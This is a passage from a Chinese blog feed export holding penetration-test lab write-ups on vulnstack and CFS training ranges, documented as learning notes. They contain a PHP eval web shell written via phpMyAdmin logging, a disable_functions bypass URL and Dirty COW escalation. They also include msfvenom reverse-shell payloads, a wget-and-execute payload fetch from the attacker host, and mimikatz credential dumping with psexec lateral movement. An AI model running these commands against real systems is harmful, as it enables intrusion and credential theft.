class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;button onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&gt;&lt;script&gt;</span><br><span class="line">&gt;function myFunction()&#123;</span><br><span class="line">   var array = new Array();</span><br><span class="line">   var x;</span><br><span class="line">   var txt=&quot;&quot;</span><br><span class="line">   array[0] = 1;</span><br><span class="line">   array[3] = 2;</span><br><span class="line">   array[4] = 3;</span><br><span class="line">   array[10] = 4;</span><br><span class="line">   for( x in array )&#123;</span><br><span class="line">       alert(array[x]);     // 依次显示出 1 2 3 4</span><br><span class="line">   &#125; </span><br><span class="line">   alert(array.length);    // 结果是11</span><br><span class="line">   for( var i=0 ; i&lt;4 ; i++)&#123;</span><br><span class="line">       alert(array[i]);     // 依次显示出 1 undefined undefined 2 </span><br><span class="line">   &#125;</span><br><span class="line">   document.getElementById(&quot;demo&quot;).innerHTML = txt;</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -Js笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstrack(三)挨打实录</title>
      <link href="/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/"/>
      <url>/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>vulstrack（三）</p><p>挨打实录</p><p>ip：<a href="http://10.203.87.242/">http://10.203.87.242/</a> </p><p>开局一个joomla 百度搜了下家谱  直接开盒</p><p><img src="image-20211118140446126.png" alt="image-20211118140446126"></p><p> 扫下   端口   扫下  目录</p><p><img src="image-20211118152707664.png" alt="image-20211118152707664"></p><p><img src="image-20211118153756313.png" alt="image-20211118153756313"></p><p><img src="image-20211118154240878.png" alt="image-20211118154240878"></p><p><img src="image-20211118155923176.png" alt="image-20211118155923176"></p><p>御剑用一半怕崩 找个工具  joomscan  工具扫到挺多</p><p>主要这个配置文件 里边有密钥 和数据库账号密码 </p><p><code>http://10.203.87.242/configuration.php~</code></p><p><img src="image-20211118162342980.png" alt="image-20211118162342980"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·ç¨å€™è®¿é—®ã€‚&#x27;; public $display_offline_message = &#x27;1&#x27;; public $offline_image = &#x27;&#x27;; public $sitename = &#x27;test&#x27;; public $editor = &#x27;tinymce&#x27;; public $captcha = &#x27;0&#x27;; public $list_limit = &#x27;20&#x27;; public $access = &#x27;1&#x27;; public $debug = &#x27;0&#x27;; public $debug_lang = &#x27;0&#x27;; public $debug_lang_const = &#x27;1&#x27;; public $dbtype = &#x27;mysqli&#x27;; public $host = &#x27;localhost&#x27;; public $user = &#x27;testuser&#x27;; public $password = &#x27;cvcvgjASD!@&#x27;; public $db = &#x27;joomla&#x27;; public $dbprefix = &#x27;am2zu_&#x27;; public $live_site = &#x27;&#x27;; public $secret = &#x27;gXN9Wbpk7ef3A4Ys&#x27;; public $gzip = &#x27;0&#x27;; public $error_reporting = &#x27;default&#x27;; public $helpurl = &#x27;https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;&#x27;; public $ftp_host = &#x27;&#x27;; public $ftp_port = &#x27;&#x27;; public $ftp_user = &#x27;&#x27;; public $ftp_pass = &#x27;&#x27;; public $ftp_root = &#x27;&#x27;; public $ftp_enable = &#x27;0&#x27;; public $offset = &#x27;UTC&#x27;; public $mailonline = &#x27;1&#x27;; public $mailer = &#x27;mail&#x27;; public $mailfrom = &#x27;test@test.com&#x27;; public $fromname = &#x27;test&#x27;; public $sendmail = &#x27;/usr/sbin/sendmail&#x27;; public $smtpauth = &#x27;0&#x27;; public $smtpuser = &#x27;&#x27;; public $smtppass = &#x27;&#x27;; public $smtphost = &#x27;localhost&#x27;; public $smtpsecure = &#x27;none&#x27;; public $smtpport = &#x27;25&#x27;; public $caching = &#x27;0&#x27;; public $cache_handler = &#x27;file&#x27;; public $cachetime = &#x27;15&#x27;; public $cache_platformprefix = &#x27;0&#x27;; public $MetaDesc = &#x27;&#x27;; public $MetaKeys = &#x27;&#x27;; public $MetaTitle = &#x27;1&#x27;; public $MetaAuthor = &#x27;1&#x27;; public $MetaVersion = &#x27;0&#x27;; public $robots = &#x27;&#x27;; public $sef = &#x27;1&#x27;; public $sef_rewrite = &#x27;0&#x27;; public $sef_suffix = &#x27;0&#x27;; public $unicodeslugs = &#x27;0&#x27;; public $feed_limit = &#x27;10&#x27;; public $feed_email = &#x27;none&#x27;; public $log_path = &#x27;/var/www/html/administrator/logs&#x27;; public $tmp_path = &#x27;/var/www/html/tmp&#x27;; public $lifetime = &#x27;15&#x27;; public $session_handler = &#x27;database&#x27;; public $shared_session = &#x27;0&#x27;; &#125;</span><br></pre></td></tr></table></figure><p>可以连3306</p><p><img src="image-20211118162420539.png" alt="image-20211118162420539"></p><p>nice</p><p><img src="image-20211118162526891.png" alt="image-20211118162526891"></p><p>什么阴间密码 能不能自己创建一个 </p><p><img src="image-20211118163059085.png" alt="image-20211118163059085"></p><p>俩模板   用户创建错地方   纯纯slm了         </p><p>哥斯拉还跑出来一个root密码</p><p><img src="image-20211118170554998.png" alt="image-20211118170554998"></p><p>mysql写马不管是 爆破出的root还是testuser没有权限</p><p>百度复制了一个类似密码  直接改了超管密码  </p><p>进入后台发现省去了添加后台超管的步骤 属于是快乐少一半 </p><p>直接使用超级管理员用户，修改<code>Beez3</code>模板的<code>error.php</code>文件</p><p>写入我的小摩托 </p><p>传马一连   （1.php是phpinfo  2.php是预留后门  爆破可以上车）</p><p><img src="image-20211118174154671.png" alt="image-20211118174154671"></p><p>发现  需要         bypass disable_functions</p><p>尝试执行命令，返回ret=127，</p><p>应该是disable_functions的限制了</p><p>通过phpinfo发现禁用了如下函数，目标是linux</p><p><img src="image-20211118183459566.png" alt="image-20211118183459566"></p><p>百度了解到  这个 加上 没有禁用putenv函数，所以可以</p><p><code>利用LD_PRELOAD绕过</code>这里需要学习 </p><p><img src="image-20211118191853428.png" alt="image-20211118191853428">虽然是个低权  头一次这么绕过     忘了蚁剑还有个插件了 、、</p><p><img src="image-20211118201050708.png" alt="image-20211118201050708"></p><p>上祖训  </p><p><code>ifconfig </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.203.87.242/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/smartb&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p><img src="image-20211118192019962.png" alt="image-20211118192019962"></p><p>查看ip信息，发现ip并不是<code>10.203.87.242 </code>是</p><p><img src="image-20211118192226867.png" alt="image-20211118192226867"></p><p>这台是个<code>ubuntu </code>  由于知识浅陋 不是很了解端口映射 猜到是是反向代理   </p><p>ubuntu应该是不出网的</p><p>应该要拿centos的权限</p><p>捣鼓半天  啥也没弄得到  乱翻var和   tmp找  找到敏感文件</p><p><img src="image-20211118195155510.png" alt="image-20211118195155510"></p><p>这adduser是新增用户 </p><p>Centos试试 ssh10.203.87.242连xshell </p><p><img src="image-20211118200019099.png" alt="image-20211118200019099"></p><p>又是  低权  吐了  （后来发现 可以爆破root密码  干）</p><p><img src="image-20211118200130214.png" alt="image-20211118200130214"></p><p>传奇再现     一块 <code>10.203.87.242</code>  一块<code>192.168.93.100</code></p><p>还得信息搜集一波  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[wwwuser@localhost ~]$ uname -a</span><br><span class="line">Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>又要 横向移动 </p><p>centos也得 提权  因为只有他是出网机 </p><p>需要把他作为横向移动的跳板  </p><p>使用脏牛  范围 包括这个 centos</p><p> 提权成功</p><p><img src="image-20211118205903081.png" alt="image-20211118205903081"></p><p><img src="image-20211118210008632.png" alt="image-20211118210008632"></p><p>网络拓补</p><table><thead><tr><th>ip</th><th>系统</th><th>任务</th><th>权限</th><th>端口</th></tr></thead><tbody><tr><td>192.168.93.10</td><td>Windows Server 2012</td><td>域控</td><td></td><td>88，135，445</td></tr><tr><td>192.168.93.20</td><td>Windows2008</td><td></td><td></td><td>80、135、139、445、1433</td></tr><tr><td>192.168.93.30</td><td>windows7</td><td></td><td></td><td>445，135</td></tr><tr><td>192.168.93.100</td><td>Centos</td><td>出网机</td><td></td><td>22，80，3306</td></tr><tr><td>192.168.93.120</td><td>Ubuntu</td><td>web服务</td><td></td><td>22，3306</td></tr></tbody></table><p>可以使用  frp 搭建隧道 时间久远  都快忘了 复习复习  </p><p><img src="image-20211119144455252.png" alt="image-20211119144455252"></p><p>或者 msf  天可怜见特意装了个msf5 终于上线  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Kali</span><br><span class="line"></span><br><span class="line">use web_delivery</span><br><span class="line">set target 6</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.203.87.193</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line">记得添加路由</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.203.87.242机器   </span><br><span class="line">wget -qO 8WMytsrE --no-check-certificate http://10.203.87.193:8080/2yJcTOurU6QbLBM; chmod +x 8WMytsrE; ./8WMytsrE&amp;</span><br></pre></td></tr></table></figure><p><img src="image-20211119152731995.png" alt="image-20211119152731995"></p><p><code>search scanner/smb/smb_version</code></p><p>发现3台windows，并且存在TEST域环境</p><p><img src="image-20211119153611258.png" alt="image-20211119153611258"></p><p><code>scanner/smb/smb_login</code>爆破smb<code> 192.168.93.20</code></p><p>这里  新装的kali 传文件是在费劲  假装爆破出来了  </p><p><img src="image-20211119155642223.png" alt="image-20211119155642223"></p><p>看超级无敌的husins的wp发现还可以爆破  暴力穷举  使用fscan</p><p>下面  psexec登陆win2008</p><p>meterpreter中进入shell</p><p><code>ps</code>查看进程  2752 explor.exe的adminnistor格外深情</p><p><img src="image-20211119162931113.png" alt="image-20211119162931113"></p><p>迁移到 administrator</p><p><img src="image-20211119162949151.png" alt="image-20211119162949151"></p><p>这里不会用 现学</p><p><code>load mimikatz</code></p><p><code>kerberos</code></p><p><img src="image-20211119162855197.png" alt="image-20211119162855197"></p><p><code>msv</code></p><p><img src="image-20211119163022698.png" alt="image-20211119163022698"></p><p><code>ipconfig -all </code></p><p><strong>定位到dns服务器为192.168.93.10，域名为test.org，一般dns服务器就是域控</strong></p><p><img src="image-20211119163350139.png" alt="image-20211119163350139"></p><p>进入shell信息收集  ping一下域控找ip</p><p><img src="image-20211119164341610.png" alt="image-20211119164341610"></p><p>ipc连接拿flag</p><p>什么是IPC$: 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><blockquote><p>又是新知识   </p></blockquote><p><img src="image-20211119164629566.png" alt="image-20211119164629566"></p><p><img src="image-20211119165448194.png" alt="image-20211119165448194"></p><p>反思：</p><p>1：对于cms了解不多 joomla!这次是第一次见到 后台模板getshell的时候多少沾点笨，对于mysql管理工具的使用不够熟练 写mysql写shell不熟练 里边两套表加用户还上当了改错了user表  joomscan真好用  、</p><p>2.bypassdisbale_functions 这个东西头一次 实际遇到 </p><p>3.本机敏感文件搜集  能找到密码   挺多密码可以爆破  这个是 遗漏的地方  </p><p>4.linux提权   脏牛的使用  和web_delivery模块 都是头一次用    其实frp啥的都行</p><p>5.横向移动      <code> smb_version+smb_login</code>主机探测加爆破 有很多方法   fscan可行 别的都挺多</p><p>6.psexec获取目标shell  mimikatz抓取明文密码  命令不会</p><p>7.获取域控shell看到有人用impacket  没用明白  看大帅哥的wp学的ipc</p><p>8.网络拓补很重要  一定要记得高低整明白 为啥下一步做什么  </p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstrack（一）</title>
      <link href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/"/>
      <url>/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>ip 10.203.87.175</p><p>先扫端口  </p><p><img src="image-20211010203614556.png" alt="image-20211010203614556"></p><p>进来是个这</p><p>phpmyadmin 初始密码<code>root</code> 进去了   </p><p>百度一下，phpMyAdmin怎么拿shell，点击变量开启日志文件，然后设置日志文件的存储路径</p><p>点击sql，创建日志文件，并定义它的路径<br><code>SET GLOBAL general_log_file=&#39;C:/phpStudy/www/123.php&#39;</code><br>查看日志功能是否开启<br><code>show variables like &#39;%general%&#39;;</code></p><p><img src="image-20211010204902729.png" alt="image-20211010204902729"></p><p>确定日志文件开启，路径也确定了。那就可以开搞了，写入一句话<br><code>select &#39;&lt;?php eval($_POST[mbg]);?&gt;&#39;</code></p><p><img src="image-20211010204947015.png" alt="image-20211010204947015"></p><p>祭蚁剑</p><p><img src="image-20211010205158961.png" alt="image-20211010205158961"></p><p>拿下这个了</p><p>传自己的马 然后 删日志文件 </p><p>控制台  <code>ipconfig /all</code></p><p><img src="image-20211010205446759.png" alt="image-20211010205446759"></p><p>应该是这个192.168.52.128的内网了   </p><p>可以ping通</p><p><img src="image-20211010213110118.png" alt="image-20211010213110118"></p><p>giegie的博客 真好</p><p>感觉蚁剑属实有点拉跨  就上冰蝎了  </p><p><img src="image-20211014183309669.png" alt="image-20211014183309669"></p><p>又传了个大马</p><p>创建新用户  <code>admin1 Cc123456.</code></p><p>没有开启 3389 端口</p><p>执行语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=``&#x27;%COMPUTERNAME%&#x27;` `call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="image-20211014192536366.png" alt="image-20211014192536366"></p><p>上 远程桌面  。 。。。</p><p><img src="image-20211014193533904.png" alt="image-20211014193533904"></p><p><code>net group &quot;domain admins&quot; /domain</code></p><p><img src="image-20211014195021705.png" alt="image-20211014195021705"></p><p><code>systeminfo</code></p><p><img src="image-20211014195905908.png" alt="image-20211014195905908"></p><p><img src="image-20211014195921839.png" alt="image-20211014195921839"></p><p><code>wmic useraccount get /all</code></p><p><img src="image-20211014200202235.png" alt="image-20211014200202235"></p><p>下一步应该是探测其他主机来着</p><p>还得是meterpreter</p><p>上 msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.203.87.148 LPORT=5556 -f exe &gt; dm.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">show options</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.203.87.148</span><br><span class="line">set Lport 5556</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="image-20211018161928311.png" alt="image-20211018161928311"></p><p><code>ipconfig</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:cf:6e:ca</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.203.87.175</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::647d:d2d9:c482:23ec</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 12</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:acb:57af</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 14</span><br><span class="line">============</span><br><span class="line">Name         : Bluetooth s Adapter</span><br><span class="line">Hardware MAC : 00:1a:7d:da:71:11</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.157.252</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::4dfb:3571:6e28:9dfc</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 15</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #2</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:3480</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 16</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 18</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #5</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 22</span><br><span class="line">============</span><br><span class="line">Name         : TAP-Windows Adapter V9</span><br><span class="line">Hardware MAC : 00:ff:44:8d:cb:b5</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.135.129</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::480f:c25c:1f43:8781</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 23</span><br><span class="line">============</span><br><span class="line">Name         : TAP-Windows Adapter V9 #2</span><br><span class="line">Hardware MAC : 00:ff:56:0b:ea:fc</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.99.189</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::4d82:616f:441c:63bd</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:cf:6e:d4</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.52.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::294a:a094:512a:1cda</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="image-20211018162053236.png" alt="image-20211018162053236"></p><p>只能说 有人 发病了 还3389,</p><p>还得是 msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid </span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="image-20211018162147720.png" alt="image-20211018162147720"></p><p>load mimikatz<br>kerberos<br>尝试获取明文密码，最后也没明出来 </p><p>还是嘎嘎弄socks5去 </p><p><code>run get_local_subnets</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi/handler) &gt; search socks</span><br><span class="line">msf5 exploit(multi/handler) &gt; use 0</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; options</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br></pre></td></tr></table></figure><p><img src="image-20211018162706618.png" alt="image-20211018162706618"></p><p><img src="image-20211018162737070.png" alt="image-20211018162737070"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -sV -Pn -n -p 80,445,443,22,35,3306 192.168.52.1-254</span><br></pre></td></tr></table></figure><p>你就说 这探测主机不香吗  为甚么有人发病啊</p><p><img src="image-20211018162808416.png" alt="image-20211018162808416"></p><p>探测到 P了  c</p><p>这里还能用  cs 进行信息收集 </p><p> 先是 cs复制到 kali设置好主机 和密码 </p><p>把下载好的cs复制到Kali<br>unzip解压</p><p>ls查看cs下的文件</p><p>查看是否具备Java环境</p><p><img src="image-20211018180758153.png" alt="image-20211018180758153"></p><p>然后上线</p><p><img src="image-20211018180823860.png"></p><p>利用cs与msf联动设置代理<br>cs的准备工作</p><p>开启cs服务端<br>设置IP和密码</p><p>开启客户端</p><p>设置监听</p><p>生成payload</p><p><img src="1574c10d5ed64857a8df0f8e6ec819b0.png" alt="请添加图片描述"></p><p>执行payload</p><p><img src="b1eadbcaf9fd4919bf350a58b230a41a.png" alt="请添加图片描述"></p><p>监听开始</p><p>目标主机上线</p><p><img src="image-20211018185431694.png" alt="image-20211018185431694"></p><p>系统信息收集<br>选中右键，打开beacon功能<br>查看网络配置</p><p><code>shell ipconfig /all</code></p><p>主机密码收集<br>cs读内存<br>使用hashdump</p><p><img src="image-20211018184804174.png" alt="image-20211018184804174"></p><p>cs读注册表密码<br>使用<code> logonpasswords</code></p><p><img src="image-20211018184900747.png" alt="image-20211018184900747"></p><p>开代理  </p><p><img src="image-20211018185927650.png" alt="image-20211018185927650"></p><p>添加路由</p><p>和msf连起来老是断 。</p><p>下一步扫描内网主机</p><p>net view 内网信息收集  </p><p><img src="image-20211025211617910.png" alt="image-20211025211617910"></p><p>工具不是很会用 感觉问题挺多 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cfs三层靶机挨打记录</title>
      <link href="/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>CFS</p><span id="more"></span><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210918183255816.png" alt="image-20210918183255816"></p><p>打开环境  thinkphp5 怼脸上了 这个版本洞洞很多  直接搜</p><p>找到个奇妙的 一键exp小工具</p><p>咔咔拿下第一台</p><p>查看 网卡  ifconfig</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913170027183.png" alt="image-20210913170027183"></p><p> 直接访问不了  没思路了   </p><p>被暴打 以后 giegie  说  流量转发 到外边来 </p><p>可以将靶机上线到msf</p><p>uname -a获取目标机信息</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913171028652.png" alt="image-20210913171028652"></p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.203.87.148 lport=9091 -f elf &gt; dmhz.elf</span><br></pre></td></tr></table></figure><p>生成后上传到靶机1 修改权限777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set payload linux/x64/meterpreter_reverse_tcp</span><br><span class="line">show options</span><br><span class="line">use milti/handler</span><br><span class="line">也可以  </span><br><span class="line">handler -p linux/x64/meterpreter_reverse_tcp -H 10.203.87.148 -P 9091</span><br><span class="line"></span><br><span class="line">有关 msf的其他命令  </span><br><span class="line">在meterpreter下</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913173901521.png" alt="image-20210913173901521"></p><p>收到会话，成功拿到<code>meterperter</code>进入主机</p><p>用 <code>MSF</code> 中的这个命令获取当前的网段：</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913212439481.png" alt="image-20210913212439481"></p><p><code>meterpreter</code>中添加路由信息：<code>run autoroute -s 192.168.22.0/24</code></p><p>使用代理模块构建代理</p><p><code>vim /etc/proxychains4.conf</code>配置代理工具</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913191947615.png" alt="image-20210913191947615"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 